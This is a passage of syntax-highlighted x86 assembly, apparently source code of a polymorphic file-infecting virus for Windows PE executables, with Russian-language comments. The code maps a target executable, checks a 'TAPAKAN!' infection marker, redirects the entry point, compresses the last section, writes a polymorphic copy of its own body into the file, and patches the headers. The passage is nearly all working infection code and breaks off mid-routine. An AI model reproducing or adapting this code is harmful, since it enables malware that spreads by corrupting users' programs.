         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc5">BadMZ</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc0">        </span><span class="sc1">; PE ?</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">  </span><span class="sc5">BadMZ</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc12">'APAT'</span><span class="sc0">  </span><span class="sc1">;TAPAKAN!</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0e0h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">BadMZ</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; NT header Size</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; esi=Object Table</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Proc1</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; esi=offset 2 Last object entry</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Pointer2MapFile</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">   </span><span class="sc1">; save   Last object entry</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc1">;------------- Set New RVA ---------------</span><span class="sc0">
</span><span class="sc5">offset2OldRVAEntrypoint</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Next3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OldRVAEntrypoint</span><span class="sc0">
                  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Next3</span><span class="sc0">
</span><span class="sc5">Next3</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc5">offset2OldRVAEntrypoint</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
                  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc5">offset2OldRVAEntrypoint</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SectionRVA</span><span class="sc4">]</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc1">;----------------------------------------;</span><span class="sc0">
         </span><span class="sc1">;----------------------------------------;</span><span class="sc0">
         </span><span class="sc1">;---- commpress last object -------------;</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Pointer2MapFile</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PhysicalOffset</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PhysicalSize</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;;</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;; PhysicalSize Object</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AllocMem</span><span class="sc0">                            </span><span class="sc1">;;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LpPackedObject</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;;</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;; Lp2CommpressDataBuffer</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Next1</span><span class="sc0">                               </span><span class="sc1">;; Lp2DwSizeOfCommprData</span><span class="sc0">
         </span><span class="sc5">SizeofLastObject</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">Next1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LZPack</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc1">;----------------------------------------;</span><span class="sc0">
         </span><span class="sc1">;----------------------------------------;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RandEAX</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">BADYSIZE</span><span class="sc4">*</span><span class="sc2">20</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AllocMem</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LpNewPolyBady</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Next2</span><span class="sc0">
</span><span class="sc5">Next2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc5">offset2Begin</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Next2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Begin</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">offset2Begin</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">BADYSIZE</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MakePolyImg</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfNewPolyBady</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc1">;--------------------------------------------</span><span class="sc0">
         </span><span class="sc1">;--------------------------------------------</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseMapFile</span><span class="sc0">
          </span><span class="sc5">offset2SizeofLastObject</span><span class="sc0"> </span><span class="sc9">EQu</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SizeofLastObject</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Begin</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PhysicalOffset</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">offset2SizeofLastObject</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc1">; NewSizeFile=PhysicalOffsetOfLastObject+NewPolyBadySize+SizeofLastPackObject</span><span class="sc0">
          </span><span class="sc1">;push eax</span><span class="sc0">
          </span><span class="sc6">pusha</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ReMapFile</span><span class="sc0">
          </span><span class="sc6">popa</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NuLL</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@FileHandler</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc5">callEx</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">offset2SizeofLastObject</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Pointer2MapFile</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">offset2SizeofLastObject</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LpPackedObject</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
          </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">     </span><span class="sc1">; записали PackedObject в ЕндОФ</span><span class="sc0">
          </span><span class="sc1">;---------</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Pointer2MapFile</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PhysicalOffset</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LpNewPolyBady</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfNewPolyBady</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">
           </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
         </span><span class="sc1">;---------------------------------------------</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfNewPolyBady</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PhysicalSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc5">jnl_</span><span class="sc0"> </span><span class="sc5">@@L1</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PhysicalSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc5">@@L1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;---------------------------------------------</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Pointer2MapFile</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; eax=PE h</span><span class="sc0">
           </span><span class="sc5">StackCommitSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">64h</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">StackCommitSize</span><span class="sc4">],(</span><span class="sc5">BADYSIZE</span><span class="sc4">/</span><span class="sc2">1000h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">1000h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc12">'APAT'</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0e0h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc12">'!HAK'</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0e4h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">FileAlign</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calcbits</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PhysicalSize</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_Align</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualSize</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">ObjectAlign</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calcbits</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SectionRVA</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualSize</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_Align</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">ImgSize</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc5">jle_</span><span class="sc0"> </span><span class="sc5">@@L2</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">ImgSize</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
           </span><span class="sc5">@@L2</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc1">;----------------------------------------------</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Pointer2MapFile</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">   </span><span class="sc1">; save New Last object entry</span><span class="sc0">
         </span><span class="sc1">;----------------------------------------------</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseMapFile</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">BadMZ</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@FileHandler</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc5">callEx</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
</span><span class="sc5">Error1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">SizeLockBuf</span><span class="sc0">
         </span><span class="sc6">popa</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">calcbits</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
           </span><span class="sc5">@Shr</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
           </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
           </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">@Shr</span><span class="sc0">
           </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">_Align</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
           </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
           </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
           </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">_AlignL1</span><span class="sc0">
           </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
           </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc5">_AlignL1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
         </span><span class="sc1">;-------------------------------------------</span><span class="sc0">
         </span><span class="sc5">CloseMapFile</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">pusha</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Pointer2MapFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc5">callEx</span><span class="sc0">  </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HheandleOfMapFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc5">callEx</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
          </span><span class="sc6">popa</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
         </span><span class="sc1">;-------------------------------------------</span><span class="sc0">
         </span><span class="sc5">ReMapFile</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc1">; &lt;- eax=Size to map</span><span class="sc0">
         </span><span class="sc1">;  -&gt; Remapped file</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">;PAGE_READWRITE</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@FileHandler</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc5">callEx</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HheandleOfMapFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc1">; v steke size</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc1">;FILE_MAP_WRITE</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc5">callEx</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc0">  </span><span class="sc1">; Замапим его</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Pointer2MapFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Proc1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">NumOfObjects</span><span class="sc4">]</span><span class="sc0">
